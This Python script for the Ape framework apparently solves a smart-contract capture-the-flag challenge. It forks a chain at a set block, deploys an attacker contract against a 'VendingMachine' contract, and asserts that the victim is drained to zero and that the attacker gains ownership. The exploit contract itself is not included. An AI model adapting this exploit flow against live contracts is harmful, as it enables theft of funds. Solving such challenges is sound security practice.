from ape import accounts, project, Contract
from ape.utils import EMPTY_BYTES32
from .utils.helper import fork, get_block, get_storage

BLOCK = 7235686
VENDING_MACHINE_CONTRACT = "0x00f4b86F1aa30a7434774f6Bc3CEe6435aE78174"


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contracts ---\n")
    vending_machine = Contract(VENDING_MACHINE_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.VendingMachineAttacker.deploy(
        vending_machine.address,
        value="0.1 ether",
        sender=attacker,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You are now one of the owners of the contract ---\n")

    assert vending_machine.balance == 0
    assert get_storage(vending_machine.address, 2) != EMPTY_BYTES32.hex()

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
